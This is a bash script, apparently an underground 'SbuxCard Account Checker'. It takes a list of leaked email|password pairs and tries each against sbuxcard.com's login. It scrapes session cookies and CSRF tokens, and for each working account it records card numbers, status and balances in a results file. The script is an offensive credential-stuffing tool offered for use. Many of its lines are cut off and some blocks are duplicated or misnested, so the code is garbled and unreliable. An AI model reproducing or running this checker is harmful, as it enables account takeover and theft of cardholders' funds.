#!/bin/bash
#CODEDBYALCHAPRO AKA ALCHADECODE
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN#       $RED█████╗ ██╗      ██████╗███████╗███████╗ ██████╗  $GR$
printf "   $GRN#       $RED██╔══██╗██║     ██╔════╝██╔════╝██╔════╝██╔════╝ $GR$
printf "   $GRN#       $RED███████║██║     ██║     ███████╗█████╗  ██║  $GRN   $
printf "   $GRN#       $RED██╔══██║██║     ██║     ╚════██║██╔══╝  ██║  $GRN   $
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GR$
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GR$
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GR$
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GR$
printf "   $WHI ------------------------------------------------------------ \n"
printf "   $YELLOW                   SbuxCard Account Checkers                 $
printf "\n"
printf "   $YELLOW                        -AlchaDecode-                        $
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi

  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
  read -p "Delay time(Default 15s): " perSec
  if [[ $perSec="" ]]; then
                perSec=15
  fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
time=$5;
header="`date +%H:%M:%S`"
getc=$(curl -c s_cookie.tmp "https://www.sbuxcard.com/index.php?page=signin" -H$
srvid=$(cat s_cookie.tmp | grep "SRVID" | grep -Po '(?<=SRVID   )[^ ]*');
getc=$(curl -c s_cookie.tmp "https://www.sbuxcard.com/index.php?page=signin" -H$
srvid=$(cat s_cookie.tmp | grep "SRVID" | grep -Po '(?<=SRVID   )[^ ]*');
visiid=$(cat s_cookie.tmp | grep "visid_incap_1107200" | grep -Po '(?<=visid_in$
inc=$(cat s_cookie.tmp | grep "incap_ses_392_1107200" | grep -Po '(?<=incap_ses$
phpsesid=$(cat s_cookie.tmp | grep "PHPSESSID" | grep -Po '(?<=PHPSESSID       $
token=$(cat page.tmp | grep '<input type="hidden" name="token" value="' | grep $
rm page.tmp
rm s_cookie.tmp
#login now
login=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/index.php?page=signin' -$
if grep -q "index.php?page=account" page.tmp; then

newinc=$(cat s_cookie.tmp | grep "incap_ses_392_1107200" | grep -Po '(?<=incap_$
newphpsesid=$(cat s_cookie.tmp | grep "PHPSESSID" | grep -Po '(?<=PHPSESSID    $
rm s_cookie.tmp
rm page.tmp
sleep 3;
page=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/index.php?page=cards' -H $
cardlist=$(cat page.tmp | grep -Po '(id="(.*?)" class="card-list)');
page=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/index.php?page=cards' -H $
cardlist=$(cat page.tmp | grep -Po '(id="(.*?)" class="card-list)');
cardid=$(echo $cardlist | grep -Po '(?<=id=")[^"]*');
aid=$(cat page.tmp | grep '&data=ey');
ajax=$(echo $aid | grep -Po '(?<="ajax=)[^&]*');
a=($(echo "$cardid" | tr ' ' '\n'))
sleep 3;
total=$(cat page.tmp | grep "My Card(s)" | grep -Po '(?<=<h2 class="mc-title">M$
echo "$email|$pass | $total |" >> $6/ResultSbuxLive.tmp;
numb=${#a[@]}
for (( i=0; i<$numb; i++)); do
card=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/ajaxController.php?ajax='$
cnum=$(cat pageo.tmp | grep '<strong>Card Number</strong>' | grep -Po '(?<=<td>$
status=$(cat pageo.tmp | grep -Po '(?<=<font color="#009933">)[^<]*');
balance=$(cat pageo.tmp | grep '<span id="cbal">
                                                                <font color="' $
if [[ ! $status ]];then
status='deactive';
fi
status='deactive';
fi
if [[ ! $balance ]];then
balance=0;
fi
echo -e "($cnum-$status-$balance)\c";
echo -e "($cnum-$status-$balance)" >> $6/ResultSbuxLive.tmp;
done
        printf "$GRN $total $CYAN[$header] $NC[ ./Alchmst] \n";
                sleep $time
elif grep -q "index.php?page=signin" page.tmp; then
        printf "$RED DIE $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[DIE] $email|$pass">> $6/ResultSbuxDie.tmp
                sleep $time
else
        printf "$RED UNKNOWN $CYAN[$header] $NC [ ./Alchmst] ";
                echo "[UNKNOWN] $email|$pass">> $6/ResultSbuxUnknown.tmp
                sleep $time
fi
                sleep $time
fi
}

SECONDS=0
for mailpass in $(cat $inputFile); do
        email=$(echo $mailpass | cut -d "|" -f 1)
        pass=$(echo $mailpass | cut -d "|" -f 2)
        jmail=${#email}
        jpass=${#pass}
        indexer=$((con++))
        printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
        check $email $pass $jmail $jpass $perSec $targetFolder
done
if [[ -e $targetFolder/ResultSbuxUnknown.tmp ]]; then
for empas in $(cat $targetFolder/ResultSbuxUnknown.tmp); do
email=$(echo $mailpass | cut -d "|" -f 1)
        pass=$(echo $mailpass | cut -d "|" -f 2)
        jmail=${#email}
		        pass=$(echo $mailpass | cut -d "|" -f 2)
        jmail=${#email}
        jpass=${#pass}
        indexer=$((con++))
        printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
        check $email $pass $jmail $jpass $perSec $targetFolder
done
fi
duration=$SECONDS
printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
